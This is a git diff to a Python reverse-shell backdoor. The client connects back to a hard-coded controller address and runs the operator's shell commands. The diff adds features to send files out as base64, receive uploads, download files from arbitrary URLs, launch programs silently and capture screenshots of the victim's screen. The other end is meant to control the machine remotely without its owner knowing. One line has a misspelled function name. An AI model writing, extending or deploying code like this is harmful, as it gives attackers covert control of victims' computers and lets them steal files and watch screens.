@@ -7,7 +7,22 @@ import time
 import shutil
 import os
 import sys # Needed for working of shutil
+import requests
 import base64
+from mss import mss
+import ctypes
+
+def screenshot():
+	with mss() as screenshot:
+		screenshot.shot()
+		# Saves the screenshot as monitor-1.png
+
+def download(url):
+	get_response = requests.get(url)
+	file_name = url.split("/")[-1]
+	file = open(file_name, "wb")
+	file.write(get_response.content)
+	file.close()
 
 def reliable_send(data):
         json_data = json.dumps(data)
@@ -26,7 +41,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			s.connect(("10.0.2.15", 42069))
+			s.connect(("127.0.0.1", 42069))
 			shell()
 			break
 		except:
@@ -49,12 +64,38 @@ def shell():
 			except:
 				continue
 		elif command[0:8] == 'download':
-			file = open(command[9:], "rb")
-			reliable_send(base64.b64encode(file.read()))
+			try:
+				file = open(command[9:], "rb")
+				reliable_send(base64.b64encode(file.read()))
+				file.close()
+			except:
+				reliable_send(base64.b64encode("*[!] Download failed!"))
 		elif command[0:6] == 'upload':
 			file = open(command[7:], "wb")
 			result = reliable_recv()
 			file.write(base64.b64decode(result))
+			file.close()
+		elif command[0:3] == 'get':
+			try:
+				download(command[4:])
+				reliable_send("[+] Successfully downloaded the file from the specified URL!")
+			except:
+				reliable_send("*[!] Unable to download the file!")
+		elif command[0:5] == 'start':
+			# Have to remove the stdin, stdout, stderror piping in the subprocess, as otherwise it waits unitl program is closed.
+			try:
+				subprocess.Popen(command[6:], shell = True)
+				reliable_send('[+] Started!')
+			except:
+				reliable_send('[!] Failed to start!')
+		elif command[0:10] == 'screenshot':
+			try:
+				screenshot()
+				file = open('monitor-1.png', "rb")
+				reliable_send(base64.b64encode(file.read()))
+				os.remove('monitor-1.png')
+			except:
+				reilable_send('[!] Could not capture a screenshot!')
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
